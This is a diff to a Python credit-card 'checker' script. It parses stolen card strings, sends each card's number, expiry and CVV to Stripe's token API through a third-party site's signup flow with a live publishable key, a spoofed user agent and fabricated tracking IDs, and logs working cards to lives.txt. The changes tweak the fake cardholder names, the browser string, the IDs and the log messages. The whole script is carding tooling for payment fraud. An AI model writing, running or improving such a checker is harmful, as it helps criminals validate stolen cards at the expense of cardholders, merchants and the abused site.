@@ -13,13 +13,13 @@ def randomString2(stringLength=8):
     letters= string.ascii_lowercase
     return ''.join(random.sample(letters,stringLength))
 
-def StripeAutomate(credit_card, ccEntry, firstname="Kardur", lastname="Sosayati"):
+def StripeAutomate(credit_card, ccEntry, firstname="Jason", lastname="Anderson"):
     ccEntry = str(ccEntry)
     ccNum, ccMonth, ccYear, ccCode = credit_card.split('|')
     api_token = "https://api.stripe.com/v1/tokens"
     session = requests.Session()
     main_source = BeautifulSoup(session.get("https://doc2scan.com/signup-register.php").text, "html.parser")
-    user_agent =  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
+    user_agent =  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
     
     headers = {
         'User-Agent': user_agent,
@@ -30,10 +30,10 @@ def StripeAutomate(credit_card, ccEntry, firstname="Kardur", lastname="Sosayati"
     }
 
     stripe_data = {
-        'time_on_page': random.randint(55382, 66382),
-        'guid': '7745e9e2-dd6a-4714-8611-2b58a9058a31',
-        'muid': '12acb9f2-2c7e-4e63-a7fc-4015949b0207',
-        'sid': 'e4e2a34f-00c2-498c-8baf-e961184d4332',
+        'time_on_page': random.randint(55382, 68020),
+        'guid': 'e8c975ed-c2e1-4cfb-ac82-1fb96d4ad03f',
+        'muid': '76fa122a-d9cf-44d8-b9ab-4e09c50bf66a',
+        'sid': '34618fcb-8540-419c-8d6b-dd16d55c2ed6',
         'key': 'pk_live_kjBJXec9yM8XgF7cuBbqHV2H',
         'payment_user_agent': 'stripe.js/303cf2d',
         'card[number]': ccNum,
@@ -73,7 +73,7 @@ def StripeAutomate(credit_card, ccEntry, firstname="Kardur", lastname="Sosayati"
         if 'code' in res.lower():
             print(Fore.LIGHTGREEN_EX + "[" + ccEntry + "]" "LIVE\t----\t" + credit_card + ' => ' + res.replace("\n", "") + Fore.RESET)
             with open("lives.txt", "a") as filelive:
-                filelive.write(credit_card + " --- Invalid CVV")
+                filelive.write(credit_card + " - Invalid CVV")
                 filelive.close()
             return("LIVE\t----\t" + credit_card + ' => ' + res.replace("\n", ""))
         else:
@@ -82,7 +82,7 @@ def StripeAutomate(credit_card, ccEntry, firstname="Kardur", lastname="Sosayati"
     except Exception as e:
         print("LIVE\t----\t" + credit_card)
         with open("lives.txt", "a") as livefile:
-            livefile.write(credit_card + " --- REAL!!!")
+            livefile.write(credit_card + " - Valid CVV")
             livefile.close()
         return("LIVE\t----\t" + credit_card)
 
